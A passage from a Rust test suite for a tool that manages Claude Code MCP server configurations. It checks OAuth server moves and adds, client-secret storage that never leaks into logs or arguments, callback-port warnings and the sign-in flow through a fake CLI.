        let plan = plan_for(
            &core,
            vec![Change::Move {
                id: user_id("sso"),
                to: Target::Local(key.clone()),
            }],
        );
        assert!(
            plan.warnings.iter().any(|w| w.contains("sign in")),
            "{:?}",
            plan.warnings
        );
        assert!(env.changes_run().is_empty(), "nothing runs before Apply");
        core.send(Command::Apply(plan.id));
        // Claude Code's part, which the fake CLI cannot play: it removes the entry, then adds it in the project.
        env.wait_for_run(1);
        let mut config = config_json(&env);
        config["mcpServers"].as_object_mut().unwrap().remove("sso");
        write_config(&env, &config);
        env.wait_for_run(2);
        let mut config = config_json(&env);
        config["projects"][&key]["mcpServers"] = serde_json::json!({"sso": serde_json::from_str::<serde_json::Value>(SSO_ENTRY).unwrap()});
        write_config(&env, &config);
        let events = collect(&core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::Applied { .. } | Event::ApplyFailed { .. }))
        });
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::Applied { changed: true, .. })),
            "{events:#?}"
        );
        let runs = env.changes_run();
        assert_eq!(runs.len(), 2, "{runs:?}");
        assert_eq!(runs[0].0, ["mcp", "remove", "-s", "user", "--", "sso"]);
        assert!(
            same_dir(&runs[0].1, &env.dir.path().join("home")),
            "{runs:?}"
        );
        assert_eq!(runs[0].2, None, "remove gets no secret");
        assert_eq!(
            runs[1].0[..7],
            [
                "mcp",
                "add-json",
                "-s",
                "local",
                "--client-secret",
                "--",
                "sso"
            ]
        );
        assert!(same_dir(&runs[1].1, &repo), "{runs:?}");
        assert_eq!(runs[1].2.as_deref(), Some(sha256(CLIENT_SECRET).as_str()));
        assert!(
            !std::fs::read_to_string(&env.log)
                .unwrap()
                .contains(CLIENT_SECRET)
        );
        // Klefki's copy moved with it.
        let values = store.values.lock().unwrap().clone();
        let local = crate::model::ConnectionId::new(Scope::Local, Some(&key), "sso");
        assert_eq!(
            values.get(&crate::secrets::user_for(&local)),
            Some(&CLIENT_SECRET.to_owned())
        );
        assert_eq!(values.len(), 1, "{values:?}");
        let config = config_json(&env);
        assert_eq!(config["tail"], 1);
        assert!(config["mcpServers"].get("sso").is_none());
        verify_passes(&core);
    }

    #[test]
    fn a_move_whose_remove_leaves_the_server_there_changes_nothing() {
        let (env, store, key, _) =
            oauth_move_env(r#"{"rules":[{"args":["mcp","remove"],"stdout_file":"removed.txt"}]}"#);
        let before = config_json(&env);
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let plan = plan_for(
            &core,
            vec![Change::Move {
                id: user_id("sso"),
                to: Target::Local(key),
            }],
        );
        let events = apply_and_wait(&core, &plan);
        let error = events
            .iter()
            .find_map(|e| match e {
                Event::ApplyFailed { error, .. } => Some(error.clone()),
                _ => None,
            })
            .unwrap_or_else(|| panic!("{events:#?}"));
        assert!(error.contains("still there"), "{error}");
        assert!(error.contains("Nothing was changed"), "{error}");
        assert_eq!(config_json(&env), before);
        let runs = env.changes_run();
        assert_eq!(runs.len(), 1, "no add after a failed remove: {runs:?}");
        assert_eq!(store.values.lock().unwrap().len(), 1);
    }

    #[test]
    fn a_move_whose_remove_hangs_is_stopped_and_changes_nothing() {
        let (env, store, key, _) =
            oauth_move_env(r#"{"rules":[{"args":["mcp","remove"],"hang":true}]}"#);
        let before = config_json(&env);
        let mut config = env.config();
        config.secrets = Some(Arc::clone(&store) as Arc<dyn crate::secrets::SecretStore>);
        config.check_timeout = Duration::from_millis(600);
        let core = start_with(config, || {});
        collect(&core, |e| !snapshots(e).is_empty());
        let plan = plan_for(
            &core,
            vec![Change::Move {
                id: user_id("sso"),
                to: Target::Local(key),
            }],
        );
        let events = apply_and_wait(&core, &plan);
        let error = events
            .iter()
            .find_map(|e| match e {
                Event::ApplyFailed { error, .. } => Some(error.clone()),
                _ => None,
            })
            .unwrap_or_else(|| panic!("{events:#?}"));
        assert!(error.contains("in time"), "{error}");
        assert_eq!(config_json(&env), before);
        assert_eq!(env.changes_run().len(), 1);
    }

    #[test]
    fn an_oauth_server_is_added_by_claude_code_with_its_secret_only_in_the_environment() {
        let (env, _, _) = oauth_add_env(ADD_JSON_OK);
        let store = Arc::new(crate::secrets::MemoryStore::default());
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let plan = plan_for(
            &core,
            vec![oauth_add("sso2", vec![Target::User], Some(CLIENT_SECRET))],
        );
        assert_eq!(plan.summary, ["Add sso2 for the user"]);
        assert_eq!(plan.action, "Add");
        let review = &plan.reviews[0];
        for line in [
            "Connects to: https://sso.example.com/mcp",
            "Signs in with OAuth as client client-7, callback port 8123",
        ] {
            assert!(review.lines.iter().any(|l| l == line), "{line}: {review:?}");
        }
        assert!(
            plan.notes.iter().any(|n| n.contains("Claude Code adds it")),
            "{:?}",
            plan.notes
        );
        assert!(
            plan.files
                .iter()
                .any(|f| f.lines.iter().any(|l| l.contains("sso2"))),
            "{:?}",
            plan.files
        );
        assert!(!format!("{plan:?}").contains(CLIENT_SECRET));
        // Nothing has run yet.
        assert!(env.add_json_runs().is_empty());

        core.send(Command::Apply(plan.id));
        env.claude_writes_when_asked(
            None,
            "sso2",
            r#"{"type": "http", "url": "https://sso.example.com/mcp", "headers": {"X-Team": "${TEAM}"}, "oauth": {"clientId": "client-7", "callbackPort": 8123}}"#,
        );
        let events = collect(&core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::Applied { .. } | Event::ApplyFailed { .. }))
        });
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::Applied { changed: true, .. })),
            "{events:#?}"
        );
        let runs = env.add_json_runs();
        assert_eq!(runs.len(), 1);
        let argv: Vec<&str> = runs[0]["argv"]
            .as_array()
            .unwrap()
            .iter()
            .map(|a| a.as_str().unwrap())
            .collect();
        assert_eq!(
            argv[..7],
            [
                "mcp",
                "add-json",
                "-s",
                "user",
                "--client-secret",
                "--",
                "sso2"
            ]
        );
        assert_eq!(argv.len(), 8);
        let sent: serde_json::Value = serde_json::from_str(argv[7]).unwrap();
        assert_eq!(
            sent,
            serde_json::from_str::<serde_json::Value>(OAUTH_DEF).unwrap()
        );
        // The secret travels only in MCP_CLIENT_SECRET.
        assert_eq!(runs[0]["secret_set"], true);
        assert_eq!(runs[0]["secret_sha256"], sha256(CLIENT_SECRET));
        let log = std::fs::read_to_string(&env.log).unwrap();
        assert!(!log.contains(CLIENT_SECRET), "{log}");
        // Klefki keeps its own copy under the new server's connection, and nowhere else.
        let id = crate::model::ConnectionId::new(Scope::User, None, "sso2");
        assert_eq!(
            store
                .values
                .lock()
                .unwrap()
                .get(&crate::secrets::user_for(&id)),
            Some(&CLIENT_SECRET.to_owned())
        );
        assert!(!walk(env.dir.path()).contains(CLIENT_SECRET));
        let rows = &snapshots(&events).last().unwrap().servers;
        assert!(rows.iter().any(|r| r.name == "sso2" && r.oauth.is_some()));
    }

    #[test]
    fn an_oauth_server_for_a_project_is_added_from_that_project_folder() {
        let (env, key, repo) = oauth_add_env(ADD_JSON_OK);
        let store = Arc::new(crate::secrets::MemoryStore::default());
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let plan = plan_for(
            &core,
            vec![oauth_add(
                "sso2",
                vec![Target::Local(key.clone())],
                Some(CLIENT_SECRET),
            )],
        );
        core.send(Command::Apply(plan.id));
        env.claude_writes_when_asked(Some(&key), "sso2", OAUTH_DEF);
        let events = collect(&core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::Applied { .. } | Event::ApplyFailed { .. }))
        });
        assert!(
            events.iter().any(|e| matches!(e, Event::Applied { .. })),
            "{events:#?}"
        );
        let run = &env.add_json_runs()[0];
        assert_eq!(run["argv"][2], "-s");
        assert_eq!(run["argv"][3], "local");
        // Claude Code adds a local server to the project it runs in.
        assert_eq!(
            std::fs::canonicalize(run["cwd"].as_str().unwrap()).unwrap(),
            std::fs::canonicalize(&repo).unwrap()
        );
        let id = crate::model::ConnectionId::new(Scope::Local, Some(&key), "sso2");
        assert!(
            store
                .values
                .lock()
                .unwrap()
                .contains_key(&crate::secrets::user_for(&id))
        );
    }

    #[test]
    fn an_oauth_server_without_a_client_secret_is_added_without_one() {
        let (env, _, _) = oauth_add_env(ADD_JSON_OK);
        let store = Arc::new(crate::secrets::MemoryStore::default());
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let plan = plan_for(&core, vec![oauth_add("sso2", vec![Target::User], None)]);
        core.send(Command::Apply(plan.id));
        env.claude_writes_when_asked(None, "sso2", OAUTH_DEF);
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        let run = &env.add_json_runs()[0];
        assert_eq!(run["secret_set"], false);
        assert!(
            !run["argv"]
                .as_array()
                .unwrap()
                .iter()
                .any(|a| a == "--client-secret")
        );
        assert!(store.values.lock().unwrap().is_empty());
    }

    #[test]
    fn the_engine_answers_whether_a_callback_port_is_held_for_that_port() {
        let (env, _, _) = oauth_add_env(ADD_JSON_OK);
        let core = with_store(&env, Arc::new(crate::secrets::MemoryStore::default()));
        collect(&core, |e| !snapshots(e).is_empty());
        let held = std::net::TcpListener::bind((std::net::Ipv4Addr::LOCALHOST, 0)).unwrap();
        let port = held.local_addr().unwrap().port();
        let answer = |core: &Core| {
            core.send(Command::CheckCallbackPort(port));
            collect(core, |e| {
                e.iter().any(|x| matches!(x, Event::CallbackPort { .. }))
            })
            .into_iter()
            .find_map(|e| match e {
                Event::CallbackPort { port, warning } => Some((port, warning)),
                _ => None,
            })
            .unwrap()
        };
        let (answered, warning) = answer(&core);
        assert_eq!(answered, port);
        assert!(
            warning
                .as_deref()
                .is_some_and(|w| w.starts_with(&format!("Port {port} is in use"))),
            "{warning:?}"
        );
        drop(held);
        assert_eq!(
            once_let_go(|| answer(&core), |(_, warning)| warning.is_none()),
            (port, None)
        );
    }

    /// What `ask` answers about a port once the test let it go. Until then another holder can have the same number
    /// for a moment: a child process another test starts keeps a copy of the listener until it runs its program, and
    /// a listener on 127.0.0.1 leaves `::1` free for another test to take. So it asks again, up to `WAIT`.
    fn once_let_go<T>(mut ask: impl FnMut() -> T, free: impl Fn(&T) -> bool) -> T {
        let deadline = Instant::now() + WAIT;
        loop {
            let answer = ask();
            if free(&answer) || Instant::now() >= deadline {
                return answer;
            }
            std::thread::sleep(Duration::from_millis(20));
        }
    }

    #[test]
    fn a_callback_port_another_program_holds_is_warned_about_in_the_review_and_the_add_goes_on() {
        let (env, _, _) = oauth_add_env(ADD_JSON_OK);
        let core = with_store(&env, Arc::new(crate::secrets::MemoryStore::default()));
        collect(&core, |e| !snapshots(e).is_empty());
        let held = std::net::TcpListener::bind((std::net::Ipv4Addr::LOCALHOST, 0)).unwrap();
        let port = held.local_addr().unwrap().port();
        let add = |json: String| Change::Add {
            name: "sso2".to_owned(),
            json,
            targets: vec![Target::User],
            secret: None,
        };
        let with_port = format!(
            r#"{{"type": "http", "url": "https://sso.example.com/mcp", "oauth": {{"clientId": "c", "callbackPort": {port}}}}}"#
        );
        let said = |plan: &PlanView| {
            plan.warnings
                .iter()
                .filter(|w| w.contains(&format!("Port {port} ")))
                .cloned()
                .collect::<Vec<_>>()
        };
        let plan = plan_for(&core, vec![add(with_port.clone())]);
        assert_eq!(plan.action, "Add");
        assert_eq!(plan.summary, ["Add sso2 for the user"]);
        let warned = said(&plan);
        assert_eq!(warned.len(), 1, "{:?}", plan.warnings);
        assert!(
            warned[0].starts_with(&format!("sso2: Port {port} is in use by another program.")),
            "{warned:?}"
        );
        // A port let go is not warned about, and neither is a server that leaves the port to Claude Code.
        drop(held);
        assert_eq!(
            once_let_go(
                || said(&plan_for(&core, vec![add(with_port.clone())])),
                Vec::is_empty
            ),
            Vec::<String>::new()
        );
        let plan = plan_for(
            &core,
            vec![add(
                r#"{"type": "http", "url": "https://sso.example.com/mcp", "oauth": {"clientId": "c"}}"#
                    .to_owned(),
            )],
        );
        assert!(
            !plan.warnings.iter().any(|w| w.contains("signing in")),
            "{:?}",
            plan.warnings
        );
    }

    #[test]
    fn when_claude_code_refuses_the_add_its_reason_is_shown_and_no_secret_is_kept() {
        let (env, _, _) = oauth_add_env(
            r#"{"rules":[{"args":["mcp","add-json"],"exit_code":1,"stderr_file":"exists.txt"}]}"#,
        );
        let store = Arc::new(crate::secrets::MemoryStore::default());
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let plan = plan_for(
            &core,
            vec![oauth_add("sso2", vec![Target::User], Some(CLIENT_SECRET))],
        );
        let events = apply_and_wait(&core, &plan);
        let error = events
            .iter()
            .find_map(|e| match e {
                Event::ApplyFailed { error, .. } => Some(error.clone()),
                _ => None,
            })
            .expect("a failure");
        assert!(error.contains("already exists"), "{error}");
        assert!(error.contains("not added"), "{error}");
        assert!(store.values.lock().unwrap().is_empty());
    }

    #[test]
    fn claude_code_saying_it_added_a_server_that_is_not_there_is_reported() {
        let (env, _, _) = oauth_add_env(ADD_JSON_OK);
        let store = Arc::new(crate::secrets::MemoryStore::default());
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let plan = plan_for(
            &core,
            vec![oauth_add("sso2", vec![Target::User], Some(CLIENT_SECRET))],
        );
        let events = apply_and_wait(&core, &plan);
        let error = events
            .iter()
            .find_map(|e| match e {
                Event::ApplyFailed { error, .. } => Some(error.clone()),
                _ => None,
            })
            .expect("a failure");
        assert!(error.contains("cannot find it"), "{error}");
        assert!(store.values.lock().unwrap().is_empty());
    }

    #[test]
    fn without_a_secret_store_an_oauth_server_with_a_secret_is_not_added() {
        let (env, _, _) = oauth_add_env(ADD_JSON_OK);
        let store = Arc::new(crate::secrets::MemoryStore::default());
        *store.fail.lock().unwrap() = Some(crate::secrets::SecretError::Unavailable(
            "no Secret Service".into(),
        ));
        let core = with_store(&env, Arc::clone(&store));
        collect(&core, |e| !snapshots(e).is_empty());
        let refused = plan_failure(
            &core,
            vec![oauth_add("sso2", vec![Target::User], Some(CLIENT_SECRET))],
        );
        // First what happened and what to do, in plain words; what the store said comes after, on its own line.
        let (plain, detail) = refused.split_once('\n').expect("a detail line");
        assert!(
            plain.starts_with("Klefki can't use your system's secret store."),
            "{refused}"
        );
        assert!(plain.contains("press Review again"), "{refused}");
        assert!(plain.contains("leave the client secret empty"), "{refused}");
        assert_eq!(
            plain.contains("GNOME Keyring"),
            cfg!(target_os = "linux"),
            "{refused}"
        );
        assert!(!plain.contains("Secret Service"), "{refused}");
        assert!(detail.contains("no Secret Service"), "{refused}");
        assert!(detail.contains("no plaintext copy"), "{refused}");
        assert!(env.add_json_runs().is_empty());
        // A store that is there but refuses says the same next step.
        *store.fail.lock().unwrap() = Some(crate::secrets::SecretError::Failed("denied".into()));
        let refused = plan_failure(
            &core,
            vec![oauth_add("sso2", vec![Target::User], Some(CLIENT_SECRET))],
        );
        let (plain, detail) = refused.split_once('\n').expect("a detail line");
        assert!(plain.contains("leave the client secret empty"), "{refused}");
        assert!(detail.contains("denied"), "{refused}");
        assert!(env.add_json_runs().is_empty());
    }

    #[test]
    fn an_oauth_add_that_cannot_be_made_is_refused_before_anything_runs() {
        let (env, key, _) = oauth_add_env(ADD_JSON_OK);
        let core = env.start();
        collect(&core, |e| !snapshots(e).is_empty());
        let gone = env
            .dir
            .path()
            .join("gone")
            .to_string_lossy()
            .replace('\\', "/");
        let mut config = config_json(&env);
        config["projects"][&gone] = serde_json::json!({});
        write_config(&env, &config);
        collect(&core, |e| {
            snapshots(e).iter().any(|s| s.projects.len() == 2)
        });
        let plain = || Change::Add {
            name: "p".into(),
            json: r#"{"type": "http", "url": "https://p.example"}"#.into(),
            targets: vec![Target::User],
            secret: Some(crate::secrets::Secret::new("x".into())),
        };
        for (change, why) in [
            (plain(), "only a server that signs in with OAuth"),
            (oauth_add("sso2", vec![Target::User], Some("")), "empty"),
            (oauth_add("sso2", vec![Target::Local(gone.clone())], None), "folder"),
            (
                Change::Add {
                    name: "s".into(),
                    json: r#"{"type": "http", "url": "https://s.example", "oauth": {"clientSecret": "inline-s3cret"}}"#.into(),
                    targets: vec![Target::User],
                    secret: None,
                },
                "handed to Claude Code on its own",
            ),
            // Claude Code's command takes the definition in its arguments, which other programs can read.
            (
                Change::Add {
                    name: "h".into(),
                    json: r#"{"type": "http", "url": "https://h.example", "headers": {"Authorization": "Bearer ghp_inlineS3cretValue123"}, "oauth": {}}"#.into(),
                    targets: vec![Target::User],
                    secret: None,
                },
                "Bearer ${AUTH_TOKEN}",
            ),
            (
                Change::Add {
                    name: "e".into(),
                    json: r#"{"type": "sse", "url": "https://e.example", "env": {"API_TOKEN": "inline-s3cret-42"}, "oauth": {"clientId": "c"}}"#.into(),
                    targets: vec![Target::User],
                    secret: None,
                },
                "${API_TOKEN}",
            ),
        ] {
            let refused = plan_failure(&core, vec![change.clone()]);
            assert!(refused.contains(why), "{change:?}: {refused}");
            assert!(!refused.contains("inline-s3cret"), "{refused}");
            assert!(!refused.contains("inlineS3cret"), "{refused}");
        }
        let _ = key;
        assert!(env.add_json_runs().is_empty());
        // A reference is what goes instead, and an ordinary value is no secret.
        plan_for(
            &core,
            vec![Change::Add {
                name: "h".into(),
                json: r#"{"type": "http", "url": "https://h.example", "headers": {"Authorization": "Bearer ${GITHUB_TOKEN}", "X-Team": "engineering"}, "oauth": {}}"#.into(),
                targets: vec![Target::User],
                secret: None,
            }],
        );
    }

    #[test]
    fn an_oauth_server_is_not_added_without_claude_codes_command() {
        let (env, _, _) = oauth_add_env(ADD_JSON_OK);
        let mut config = env.config();
        config.claude = Some(
            env.dir
                .path()
                .join(if cfg!(windows) { "nope.exe" } else { "nope" }),
        );
        let core = start_with(config, || {});
        collect(&core, |e| !snapshots(e).is_empty());
        let refused = plan_failure(&core, vec![oauth_add("sso2", vec![Target::User], None)]);
        assert!(refused.contains("Claude Code's command"), "{refused}");
    }

    #[test]
    fn a_name_taken_after_review_stops_the_oauth_add_before_it_runs() {
        let (env, _, _) = oauth_add_env(ADD_JSON_OK);
        let core = env.start();
        collect(&core, |e| !snapshots(e).is_empty());
        let plan = plan_for(&core, vec![oauth_add("sso2", vec![Target::User], None)]);
        let mut config = config_json(&env);
        config["mcpServers"]["sso2"] = serde_json::json!({"command": "someone-else"});
        write_config(&env, &config);
        let events = apply_and_wait(&core, &plan);
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::ApplyFailed { .. })),
            "{events:#?}"
        );
        assert!(env.add_json_runs().is_empty());
        assert_eq!(
            config_json(&env)["mcpServers"]["sso2"]["command"],
            "someone-else"
        );
    }

    // Signing in (decision 005).

    const LOGIN_PAGE: &[u8] =
        include_bytes!("../../../fixtures/mcp-login/synthetic-waiting-https.txt");
    const LOGIN_HTTP_PAGE: &[u8] =
        include_bytes!("../../../fixtures/mcp-login/real-waiting-http.txt");
    const LOGIN_SIGNED_IN: &[u8] =
        include_bytes!("../../../fixtures/mcp-login/real-signed-in-tail.txt");
    const LOGIN_PORT_IN_USE: &[u8] =
        include_bytes!("../../../fixtures/mcp-login/real-port-in-use.txt");

    fn sign_in_steps(events: &[Event], name: &str) -> Vec<SignInStep> {
        events
            .iter()
            .filter_map(|e| match e {
                Event::SignIn { id, step } if id.name == name => Some(step.clone()),
                _ => None,
            })
            .collect()
    }

    fn sign_in_ended(events: &[Event], name: &str) -> bool {
        sign_in_steps(events, name).iter().any(|s| {
            matches!(
                s,
                SignInStep::SignedIn | SignInStep::Failed(_) | SignInStep::Cancelled
            )
        })
    }

    /// A user http server `web`, a local http server `loc` in a real project folder, a stdio server and an unapproved
    /// project http server; `login` is the rule for `claude mcp login`.
    fn sign_in_env(login: &str, files: &[(&str, &[u8])]) -> (Env, String) {
        let dir = tempfile::tempdir().unwrap();
        let project = dir.path().join("proj");
        std::fs::create_dir_all(&project).unwrap();
        std::fs::write(
            project.join(".mcp.json"),
            r#"{"mcpServers":{"repo":{"type":"http","url":"https://repo.example.com/mcp"}}}"#,
        )
        .unwrap();
        let project = project.to_str().unwrap().replace('\\', "/");
        let mut all: Vec<(&str, &[u8])> = vec![("connected.txt", CONNECTED)];
        all.extend_from_slice(files);
        let env = Env::new(
            &serde_json::json!({
                "mcpServers": {
                    "web": http("https://mcp.example.com/mcp"),
                    "cmd": {"type": "stdio", "command": "x"}
                },
                "projects": {project.clone(): {"mcpServers": {"loc": http("https://loc.example.com/mcp")}}}
            }),
            &format!(
                r#"{{"rules":[{login},{{"args":["mcp","get"],"stdout_file":"connected.txt"}}]}}"#
            ),
            &all,
        );
        // Keep the project folder for as long as the environment.
        std::mem::forget(dir);
        (env, project)
    }

    fn started(core: &Core) -> Arc<Snapshot> {
        let events = collect(core, |e| e.iter().any(|x| matches!(x, Event::Snapshot(_))));
        events
            .iter()
            .find_map(|e| match e {
                Event::Snapshot(s) => Some(Arc::clone(s)),
                _ => None,
            })
            .unwrap()
    }

    #[test]
    fn signing_in_runs_claude_in_the_servers_folder_opens_the_checked_page_and_checks_again() {
        let mut transcript = LOGIN_PAGE.to_vec();
        transcript.extend_from_slice(LOGIN_SIGNED_IN);
        let (env, project) = sign_in_env(
            r#"{"args":["mcp","login","*","--no-browser"],"stdout_file":"login.txt","exit_code":0}"#,
            &[("login.txt", &transcript)],
        );
        let core = env.start();
        started(&core);
        let gets_before = env.runs(&["mcp", "get", "loc"]);
        core.send(Command::SignIn(local_id("loc", &project)));
        let events = collect(&core, |e| {
            sign_in_ended(e, "loc")
                && e.iter().skip_while(|x| !matches!(x, Event::SignIn { step: SignInStep::SignedIn, .. }))
                    .any(|x| matches!(x, Event::Status { id, status: Status::Connected, .. } if id.name == "loc"))
        });
        let steps = sign_in_steps(&events, "loc");
        assert_eq!(
            steps[0],
            SignInStep::Starting {
                wait: Duration::from_secs(20)
            }
        );
        let SignInStep::Waiting { host, link, opened } = &steps[1] else {
            panic!("{steps:?}");
        };
        assert_eq!(host, "auth.example.com");
        assert!(opened);
        assert_eq!(*lock(&env.opened), vec![link.clone()]);
        assert!(link.starts_with("https://auth.example.com/authorize?"));
        assert_eq!(steps.last(), Some(&SignInStep::SignedIn));
        // Confirmed by Claude's own check.
        assert!(env.runs(&["mcp", "get", "loc"]) > gets_before);
        // Run as `claude mcp login loc --no-browser`, in the project's folder (Claude finds a local server there).
        let log: Vec<serde_json::Value> = std::fs::read_to_string(&env.log)
            .unwrap()
            .lines()
            .map(|l| serde_json::from_str(l).unwrap())
            .collect();
        let login = log
            .iter()
            .find(|l| l["event"] == "start" && l["argv"][1] == "login")
            .unwrap();
        assert_eq!(
            login["argv"],
            serde_json::json!(["mcp", "login", "loc", "--no-browser"])
        );
        assert_eq!(
            std::fs::canonicalize(login["cwd"].as_str().unwrap()).unwrap(),
            std::fs::canonicalize(&project).unwrap()
        );
        assert_eq!(login["secret_set"], false);
    }

    #[test]
    fn a_user_server_signs_in_from_the_home_folder_and_a_failure_says_claudes_reason() {
        let (env, _) = sign_in_env(
            r#"{"args":["mcp","login","web","--no-browser"],"stdout_file":"login.txt","exit_code":1}"#,
            &[("login.txt", LOGIN_PORT_IN_USE)],
        );
        let core = env.start();
        started(&core);
        core.send(Command::SignIn(user_id("web")));
        let events = collect(&core, |e| sign_in_ended(e, "web"));
        let Some(SignInStep::Failed(why)) = sign_in_steps(&events, "web").pop() else {
            panic!("{events:?}");
        };
        assert!(
            why.said
                .as_deref()
                .is_some_and(|s| s.contains("port 8766 is already in use")),
            "{why:?}"
        );
        assert!(why.can_retry, "{why:?}");
        assert!(lock(&env.opened).is_empty());
        // The sign-in that ended is over as soon as it says so: trying again at once starts again.
        core.send(Command::SignIn(user_id("web")));
        let events = collect(&core, |e| sign_in_ended(e, "web"));
        let steps = sign_in_steps(&events, "web");
        assert!(
            matches!(steps.as_slice(), [SignInStep::Starting { .. }, .., SignInStep::Failed(w)] if w.can_retry),
            "{steps:?}"
        );
    }

    #[test]
    fn only_http_and_sse_servers_that_claude_uses_sign_in_and_nothing_runs_otherwise() {
        let (env, project) = sign_in_env(
            r#"{"args":["mcp","login"],"stdout_file":"login.txt","exit_code":0}"#,
            &[("login.txt", LOGIN_SIGNED_IN)],
        );
        let core = env.start();
        started(&core);
        for (id, says) in [
            (user_id("cmd"), "HTTP or SSE"),
            (
                ServerId::new(Scope::Project, Some(&project), "repo"),
                "Approve",
            ),
            (user_id("gone"), "no longer"),
        ] {
            let name = id.name.clone();
            core.send(Command::SignIn(id));
            let events = collect(&core, |e| sign_in_ended(e, &name));
            let steps = sign_in_steps(&events, &name);
            assert!(
                matches!(steps.as_slice(), [SignInStep::Failed(w)] if w.title.contains(says) && !w.can_retry),
                "{name}: {steps:?}"
            );
        }
        assert_eq!(env.runs(&["mcp", "login"]), 0);
    }

    #[test]
    fn a_page_that_is_not_https_is_never_opened() {
        let (env, _) = sign_in_env(
            r#"{"args":["mcp","login"],"stdout_file":"login.txt","hang":false,"exit_code":0}"#,
            &[("login.txt", LOGIN_HTTP_PAGE)],
        );
        let core = env.start();
        started(&core);
        core.send(Command::SignIn(user_id("web")));
        let events = collect(&core, |e| sign_in_ended(e, "web"));
        let steps = sign_in_steps(&events, "web");
        assert!(lock(&env.opened).is_empty(), "{steps:?}");
        assert!(
            !steps
                .iter()
                .any(|s| matches!(s, SignInStep::Waiting { .. })),
            "{steps:?}"
        );
    }

    #[test]
    fn one_sign_in_at_a_time_and_cancel_stops_claude() {
        let dir = tempfile::tempdir().unwrap();
        let pid_file = dir.path().join("pid");
        let (env, project) = sign_in_env(
            &format!(
                r#"{{"args":["mcp","login"],"hang":true,"write_pid_to":{}}}"#,
                serde_json::Value::from(pid_file.to_str().unwrap())
            ),
            &[],
        );
        let core = env.start();
        started(&core);
        core.send(Command::SignIn(user_id("web")));
        collect(&core, |e| {
            sign_in_steps(e, "web")
                .iter()
                .any(|s| matches!(s, SignInStep::Starting { .. }))
        });
        let pid = wait_for_pid(&pid_file);
        // Another one, and the same one again, are refused while it runs.
        core.send(Command::SignIn(local_id("loc", &project)));
        core.send(Command::SignIn(user_id("web")));
        let events = collect(&core, |e| {
            sign_in_ended(e, "loc")
                && sign_in_steps(e, "web")
                    .iter()
                    .any(|s| matches!(s, SignInStep::Failed(_)))
        });
        assert!(
            matches!(sign_in_steps(&events, "loc").as_slice(), [SignInStep::Failed(w)] if w.title.contains("already signing in to web")),
            "{events:?}"
        );
        // Pasting before the page is there is refused, not typed.
        core.send(Command::SignInPaste {
            id: user_id("web"),
            address: "http://localhost:1/callback?code=x&state=y".into(),
        });
        let events = collect(&core, |e| {
            sign_in_steps(e, "web")
                .iter()
                .any(|s| matches!(s, SignInStep::PasteRefused(_)))
        });
        assert!(!sign_in_ended(&events, "web"));
        core.send(Command::CancelSignIn(user_id("web")));
        collect(&core, |e| {
            sign_in_steps(e, "web").contains(&SignInStep::Cancelled)
        });
        assert!(gone_soon(pid), "claude {pid} still runs");
        // Once it ended, another sign-in may start.
        core.send(Command::SignIn(local_id("loc", &project)));
        collect(&core, |e| {
            sign_in_steps(e, "loc")
                .iter()
                .any(|s| matches!(s, SignInStep::Starting { .. }))
        });
        core.send(Command::CancelSignIn(local_id("loc", &project)));
        collect(&core, |e| {
            sign_in_steps(e, "loc").contains(&SignInStep::Cancelled)
        });
    }

    #[test]
    fn closing_klefki_stops_a_running_sign_in() {
        let dir = tempfile::tempdir().unwrap();
        let pid_file = dir.path().join("pid");
        let (env, _) = sign_in_env(
            &format!(
                r#"{{"args":["mcp","login"],"hang":true,"write_pid_to":{}}}"#,
                serde_json::Value::from(pid_file.to_str().unwrap())
            ),
            &[],
        );
        let core = env.start();
        started(&core);
        core.send(Command::SignIn(user_id("web")));
        let pid = wait_for_pid(&pid_file);
        drop(core);
        assert!(
            gone_soon(pid),
            "claude {pid} still runs after Klefki closed"
        );
    }

    #[test]
    fn open_again_opens_the_running_sign_ins_page_again() {
        let dir = tempfile::tempdir().unwrap();
        let line = dir.path().join("line.txt");
        // Claude prints the page and waits for a pasted address.
        let (env, _) = sign_in_env(
            &format!(
                r#"{{"args":["mcp","login"],"require_tty":true,"stdout_file":"login.txt","read_line_to":{}}}"#,
                serde_json::Value::from(line.to_str().unwrap())
            ),
            &[("login.txt", LOGIN_PAGE)],
        );
        let core = env.start();
        started(&core);
        core.send(Command::SignIn(user_id("web")));
        collect(&core, |e| {
            sign_in_steps(e, "web")
                .iter()
                .any(|s| matches!(s, SignInStep::Waiting { .. }))
        });
        core.send(Command::OpenSignInPage(user_id("web")));
        let events = collect(&core, |e| {
            sign_in_steps(e, "web")
                .iter()
                .any(|s| matches!(s, SignInStep::Waiting { .. }))
        });
        assert!(!sign_in_ended(&events, "web"));
        let opened = lock(&env.opened).clone();
        assert_eq!(opened.len(), 2);
        assert_eq!(opened[0], opened[1]);
        core.send(Command::CancelSignIn(user_id("web")));
        collect(&core, |e| {
            sign_in_steps(e, "web").contains(&SignInStep::Cancelled)
        });
    }

    #[test]
    fn open_again_opens_only_the_page_claude_printed() {
        // Claude prints the page and ends.
        let (env, _) = sign_in_env(
            r#"{"args":["mcp","login"],"stdout_file":"login.txt","exit_code":0}"#,
            &[("login.txt", LOGIN_PAGE)],
        );
        let core = env.start();
        started(&core);
        // Before any sign-in: nothing to open.
        core.send(Command::OpenSignInPage(user_id("web")));
        core.send(Command::SignIn(user_id("web")));
        collect(&core, |e| sign_in_ended(e, "web"));
        assert_eq!(lock(&env.opened).len(), 1);
        // After it ended: nothing is opened again.
        core.send(Command::OpenSignInPage(user_id("web")));
        core.send(Command::Refresh { live_all: false });
        collect(&core, |e| e.iter().any(|x| matches!(x, Event::Snapshot(_))));
        assert_eq!(lock(&env.opened).len(), 1);
    }

    fn wait_for_pid(file: &Path) -> u32 {
        let until = Instant::now() + WAIT;
